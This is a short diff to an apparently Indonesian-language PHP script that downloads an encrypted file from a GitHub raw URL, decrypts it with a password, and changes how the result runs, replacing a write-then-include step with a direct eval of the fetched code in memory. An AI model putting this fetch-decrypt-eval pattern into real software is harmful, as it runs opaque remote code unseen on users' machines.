@@ -26,9 +26,5 @@ $d = decrypt(file_get_contents('https://raw.githubusercontent.com/mrsetset/setse
 if(empty($d)) {
 	echo "[!] Password salah!\n\n";
 } else {
-	$f=fopen('setset.php','w');
-	fwrite($f,$d);
-	fclose($f);
-
-	include('setset.php');
+	eval("?>".$d);
 }
